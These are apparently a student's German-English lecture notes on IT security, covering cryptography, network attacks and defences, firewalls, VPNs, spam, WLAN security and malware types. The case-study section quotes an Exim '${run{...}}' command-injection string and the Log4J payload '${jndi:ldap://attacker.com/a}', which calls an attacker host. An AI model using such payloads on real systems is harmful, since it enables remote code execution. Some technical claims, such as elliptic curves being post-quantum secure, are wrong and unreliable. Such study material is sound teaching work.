
# Kryptologie
### `Steganograhpie`
- Manipulation von Bild, Audio und Videodateien

---
### `Kryptographie`
- `Symmetrisch`
  - Monoalphabetisch: Cäsar, ROT13, XOR
    -> Weak gegen Kryptanalyse (Bigramme {wie häufig folgt Buchstabe B auf A})
    -> Weak gegen Bruteforce
    -> improved by replacing similiar looking chars eg. I and l

  - Polyalphabetisch DECT,  Vignere-Verschlüsselung (mit tabelle)
  - Stromchiffren: RC4 S-Box mit 256 Werten initialized mit key
      -> jeder schritt changed S-Box -> Absender und Empfänger gleiches Ergebnis
      -> Add Nonce, hash the Passphrase with Nonce
  - Blockchiffren: IDEA, DES, AES
    - Konzept: Blockweise verschlüsseln eg 64 Bit
    - Electronic Code Book Mode:
      - Pro: Error nur in einem Block
      - Con: gleiche Blöcke same Ergebnis
    - Cipher Block Chaining Mode:
      - uses last block to encript the next
      - Pro: error only last 2 blocks, more secure
      - Con: nicht parallelisierbar
    - DES: Permutation -> Halbieren -> mehrere Runden -> zsm führen -> Permutation
    - AES: Theoretisch gebrochen aber Bruteforce dauert zu lang -> gucci
---
- `Asymmetrisch`
  - RSA uses Primfaktorzerlegung -> Big Primes good secure,
    - N = p * q (both primes) N ist im private und public key enthalten, rest wird durch eine teilerfremde zahl zwischen 1 < e < phi(N)
  - Eliptic Curve (Abelsche Gruppe, die auf eine Eliptic Curve mapped), Add + Mul ersetzen Mul und Exp von RSA, Diffie-Hellmann
    - Post Quantum sicher und effizienter
---

### `Asymmetrische Kryptographie`
- Pro:
  - einfacher Schlüsselaustausch
- Con:
  - Aufwendige Berechnung
  - Long Key
- Key exchange
  - Person A and B hab pub and private Key
  - Eachs persons private key get encripted with pub key from other person -> send that shit -> can decrypt it
  
---
### `Hybrid Verschlüsselung`
- Funktioniert mit Session Keys
- Mischung aus (A)Symmetrisch 
---

### `Integrität`
- Nachweis Nachricht ist original -> hash -> Problem Kollisionen -> relevante hash Algorithmen SHA, SHA256, SHA512 und MD5
- Lösung Signatur durch hash -> Signatur S = enc(H, Kpriv), hash(N) == dec(H, Kpub) 
- Salt wird geadded für safety (salt = pro password, pepper = globaler Zusatz)
---

### `Authentizität`
- Digitale Certs durch trusted Cert stores
- Nachweiß, das der Sender wirklich Sender ist -> Zertifikate SSL, TLS
- TLS OSI -> App Layer
- TLS -> Keygen (symmetrisch) -> Keyswap (asymmetrisch) -> communication (symmetrisch) 
- Heartbeat Attack checkt nur payload_length (SSL-Header) ab -> "sends huge number" gets "huge response with unwanted data"

# `Netzwerk`:
### `Angriffsziele`
- Belauschen
- Unterdrücken
- Manipulieren
- Verfügbarkeit
- Datenübertragung
- -> Gegenmaßnahme Security by obscurity & complexity
  - gefährlich

---
### `Ziele identifien`
- IP ranges
- DNS Einträge
- Social Engineering
- Reverse Engineering

### `Commands to Check`
- Erreichbarkeit -> ping
- Netzinfrastruktur -> traceroute
- Angebotene Dienste -> portscan
- OS -> OS Fingerprint 


---
### `Scans`
- Durchgefürt durch `pings / nmap etc` 
- Idle Scan = Zombie Scan == Host merkt nicht, dass er gscannt wird 
- IP Scans = Information durch res code (wird von Zombie IP durchgeführt)
    - pro: IDS hält Zombie für attacker
    - con: needs Zombie, has to be "idle", zeitaufwändig
- Es wird nach offenen Ports (UDP, TCP), dem OS, Timing etc gescannt

---
### `Angriffe durchführen`
- Mit `hping2` werden Paktete (Header) verändert. 
- Uses: Port Scanner, change Fragmentierung, Path MTU erkennen, Traceroute über TCP, Flooding etc
- Man kann sich TCP und UDP Pakete selber bauen, seine Fragmentation faken (max Packetgröße bzw. das Offset) 
`=> IDS und Firewall täuschen`


### `IP / Mac Spoofing`
IP und Mac Adressen können gefaked werden `(mit nmap)` -> `IP / Mac Poisoning` -> `ARP Poisoning`

---
### `Bridge = Dummer Switch`
- leitet Nachrichten nur weiter / Verbinded 2 Netzwerke

### `Switch`
- Mapped Mac Adressen und leitet Nachrichten dementsprechend weiter
---
### `Angriffe erkennen`
- `IPS` -> Intrusion Prevention System -> blocked verdächtige IPs, Rewrite Bad Packets
- `IDS` -> Intrusion Detection System
- `HIDS` -> Host Intrusion Detection System (checks filesystem / logs) -> examples AIDE (custom Filesystem Rules), tripwire, Afick, LogSentry
- `NIDS` -> Network Intrusion Detection System (checks network traffic) -> examples: snort (useful behind firewall)

### `Schutz vor Angriffen`
- Portscan -> unnötige ports schließen, deny statt reject (takes longer)
- Angriffe Erkennen IDS/IPS
- Firewalls -> Filters Packets, can be stateful, used in routern, on device (iptables), enables good Proxy architectures  
  - Paketfilter -> filtert jedes Paket (no kontext) (most simple filter)
  - Stateful Firewalls (merkt sich verbindungen, erkennt zusammenhägne) (bessere filterung als stateless) -> aber easy to DoS
---
### `Protocol Stuff`
- Stateful UDP?
  - Hier Client A und Client B "täuschen ausgetauschte IP & Port dem Sykpe server vor" 
- Email Prokolle beschränken `SMTP`, `IMAP` und `POP3`
  - Solution: `HTTP Proxy` 
    - Internet -> Firewall -> Eingehender Mailserver -> Firewall -> Proxy / Internet Mail Server / Internes Netz
      - Segmentierung: Aufteilung in so klein wie mögliche Kontextbereiche (jeweils mit firewalls)
---
## `Firewall bleibt Firewall (Nicht auch Webserver, Mailserver etc...)`

### `Firewalls`
- Checks Paket Header and discards if needed
- On Device Iptables (rule based, chaining), OpenBSD
- Bei IPv6 sollte man ICMPv6 nicht filtern 
- Honeypot == Teergrube (falle für Angreifer vortäuschen von offenen Ports / falscher Dienste)
  - Beobachtung des Angreifers
  - Angreifer verschwendet Zeit

### `Application Level Firewall (Proxy)`
- `Forward Proxy` -> Client wants GET from outside -> Proxy checks if request from server is fine -> else blocks
- `Reverse Proxy` -> Client wants sth from server but calls proxy over internet -> proxy decides which server it goes to (if even to some) -> server answers proxy -> proxy answers over internet to client 
- Antivirus Proxy 
  - mit squid -> squid is forward proxy, squid also checks URL for safety, if ok bypass proxy next request
    - pro: sehr generic, sehr flexible
    - con: complex setup, doppeltes laden
  - mit dans guardian + squid -> dans guardian = content filter
    - pro: nur ein zugriff, chache wird gescannt
    - con: info verlust durch schachtelung (mit squid)
- `Transparent Proxy` (Clients dont know a proxy exists)
  - Header manipulation
- Bridge Proxy

---
### `VPN und Tunneling`
- Tunneling Variants:
  - A: Use diff protocol
  - B: Request look like diff protocol
  - C: Pack it IPsec, IPv4 in IPv6
  - Possible Tunnels: IPsec, IPv4 in IPv4 Tunnel, IPv6 in IPv4 Tunnel, IPv4 in IPv6 Tunnel
- VPN
  - VPN Client Device can send packets over tunnel, bypassing firewall etc 
  - VPN Client provides a virtual Network card, which is registered in VPN 
- VPN How To
  - `IPSec`
    - `AH: Authentication Header` `NO ENCRIPTED`
      - `Transport Mode`:
        - Header contains authentication data etc, works on TCP Header
        - Pro: small overhead, cant be faked, safe vs replay attacks
        - Con: NAT: source- dest adress changed, dest port also changed
      - `Tunnel Mode`:
        - contains authentication data etc, uses Original IP Header / Payload
        - more flexible than transport mode, tunnel through unsafe networks
    - `ESP: Encapsulated Security Payload`
      - `Transport Mode`:
        - same as in AH but TCP Header / Payload is encrypted
      - `Tunnel Mode`:
        - same as in AH but packet is encrypted
  - Other: Wireguard (UDP), OpenVPN (TLS over UDP / TCP)
  - Also: DNS Tunneling

--- 
### `Angriffstypen`
- `Sniffen` -> Wireshark
- `ARP-Poisoning` (Remember ARP: "Who has X MAC/IP Adress ?" -> returns MAC/IP Adress) -> Fake MAC/IP to recieve Information
  - Gegenmaßnahme: Static ARP, Portüberwachung am Switch, Encryption
- `DNS-Poisoning`: Unwanted DNS replies
Folge => Man in the Middle

- `DoS` = technische Störmaßnahme
  - einzelner Programmabsturz, Routing-Angriffe, Ping of Death
- `DDoS` 
  - SYN-Flooding, IP-Spoofing (OpferIP als sourceAddr -> Netzüberlastung), DNS-Amplification (OpferIP -> kleine Anfrage, big DNS Response), Smurf-Angriff (Ping von OpferIP an Broadcast of Network -> alle Rechner antworten)
  - Gegenmaßnahmen: SYN-Cookie, RateLimit, LoadBalancer, "Cloud Computing" (AWS, Google Clouds problem 👍)
- `TearDrop` = TCP-Paket mit neg Fragmentlänge -> Crash
- `Land-Angriff` = Fake IP Paket, where Source = Dest IP, SYN Flag set => endlos loop 
- `EMP`

# `Datenschutz`
## `Mix Konzept`
- Datenschutz als "Base Einstellung"
- Privacy By Design
- Transparenz und Informationspflicht

## `Increase Datenschutz`
- `JAP` - Java Anonymous Proxy
- `TOR Browser`
  - Wechselnde Routen
  - Received Header entfernt
  - Random Pfadwahl
  - Nutzt Onion Routing (TOR Netzwerk)

# `OSINT Open Source Intelligence`
- Use Google / Tools to gather Information 
## `Social Engineering`
- Schlechte Passwörter rausfinden (z.B. Geburtstag etc..)
- Gegenmaßnahme no Passwords
  - -> 2 Faktor Authentication mit FIDO Key
## `FIDO`
- FIDO Alliance > 250 Member (alle big Tech firmen)
- `Goal:` No more PW
- `Zwei` und `Multifaktor Authentifizierung` mit Tokens (USB etc), Biometrischen (Fingerprint), shared secrets (Win PW / PIN ), RFID / NFC / BLE / Bluetooth
- FIDO is like SSH Key Auth but with trusted FIDO Plattform as Challenge Receiver 

# `Fallbeispiele`
## `Exim - Remote Code Execution`
- Exim = mail server
- attacker must keep connection open for 7 days
- attacker send mail to `"${run{...}}@localhost"` (where "localhost" is one of Exim's local_domains) and execute arbitrary commands, as root
- expand_string() executes passed in string (user can pass a command which is run as root)
- bad condition for long connections `process_recipients != RECIP_ACCEPT`
---
## `Log4J - Java go brrr`
- Logging Lib for Java
- still fine code `log.info("UserAgent:{}", userAgent);`
- set userAgent to `${jndi:ldap://attacker.com/a}` -> liefert eine Java Klasse, die ausgeführt werden kann -> Remote Code Injection RCI / Remote Code Execution RCE
- `${${::-${::-$${::-j}}}}` = JNDI endless recursion -> DoS

# `Anti Spam`

## `Was ist Spam`
- `UCE` = Unsolicted Commercial E-Mail (unwanted Email with buy me)
- `UBE` = Unsolicted Bulk E-Mail (general spam mail) 
- -> ziel: verkauf von stuff, vermittlungsprovision, prep für scams
---
## `Filter Methoden`
- `Inhaltlich`
  - statisch
  - Bayes Filter
  - Wortmuster
  - AI
  - -> Generiert Score, score > threshhold -> spam
    - => false positives and false negatives 
  
- `BlackListing`
  - Ignore known Spam Adresses / Honeypot 
- `WhiteListing`
  - Accept known good Adresses
- `GreyListing`
  - Send error message for the first time
  - Non Spam will resend -> can whitelist 

- `Honeypot adressen`
  - zusätzliche mail adressen
  - sender an die mail temorär Blacklisted
---
## `Spam Prävention`
- How they get the Adresses
  - Data Breaches
  - Web Scraping
  - Adress Handel
  - Malware
  - "Freiwillige" Teilnahme
  - => diese Sachen vermeiden (Example: Email on Website as image instead of Text or " " between each char) 

# `WLan Sicherheit`
## `History`
- 1. `No Encryption`
- 2. `WEP Encryption`
  - Cäsar cipher or XOR
  - PseudoRandom as Key
  - RC4
  - Shared Key Authentication (belauschbar, bei ausreichend Paketen -> key berechenbar)
- 3. `WPA2` IEEE 802.11i
  - AES Verschlüsselung
  - Auth via PSK und Radius
  - Attacks Brute-Force, KRACK, WPS-PIN-Cracking, Attack bei Energiesparmodus von AP (Access Point)
- 4. `WPA3`
  - WiFi Easy Connect (QR Code, NFC)

# `Malware`
                                   Trojaner -> PUA
            Transport-Mechanismus  Wurm
                                   Virus  Programm / Makro Virus, Boot-sektor-Virus
    Malware   
            Shad-Funktion Rootkit
                          Spyware
                          Backdoor
                          Adware
                          and more

## `Virus`
- Vermehrt sich `selbständig` -> Nachfolger added Header: neue Magic Number, Magic Number zeigt auf DOS-Stub 
- like irl virus
- Entwicklung
  - Schadfunktionen, Tarnkappen Viren, Polymorphe Viren
---
## `Wurm`
- eats hosts ressources like irl worm
- verbreitet sich über Sicherheitslücken im Netz z.B. Buffer-Overflow
- `Buffer-Overflow`
  - write more than expected
  - Overwrite Stack (Rücksprungadressen + Inject own code)
  - Erstetzen des Programm Counters (PC)
  - Execute own code
  - Stack funktioniert so: PC speichert sich Rücksprungadresse von Funktion, wenn Stack zugemüllt ist (im Bufferoverflow), kann man an die Rücksprungadresse ändern und Schadcode adden 
  - How ? `Nutzereingaben` 
  - `Stack Overflow, Heap Overflow` etc..
  - Gegenmaßnahmen ? Canary, Non Executable Stack
---
## `Trojaner`
- Breiten sich aus durch: infected emails, unsichere Downloads, bösartige links
- Funktionen: Hintertüren, Datendiebstahl, Keylogger, Botnetz, Ransomware
  - Installiert PUA Potentially Unwanted Apps
---
## `Moderne Malware = Trojaner Wurm`
- Ziele
  - Daten manipulieren / löschen
  - Daten ausspähen
    - `Keylogger`, `Spyware`, `Adware`
  - Nutzer erschrecken / erpressen
    - `Scareware` (ihr windows hat 69 Viren install X), `Ransomware` (locks Data -> erpressen), `Hoax` (Unechte Warnmeldung)
  - Rechner übernehmen
    - `Rootkit` (Get Adminrechte -> change usrname + pw)
      - Arten: Programm-Kits, Kernel-Rootkits, Userspace-Rootkits
    - `Backdoor`
    - `Bot`-Netz
---
## `Malware Scanner`
- Heuristik
- Signaturbasiert
- Verhatensbasiert
- Genauigkeit von Tests
---
## `Drive By Download`
- "Gute" Seite hat faulen Link mit Malware Download
- Actual Gute Seiten auch betroffen durch SQL Injection, Cross Site Scripting, Code Injection etc...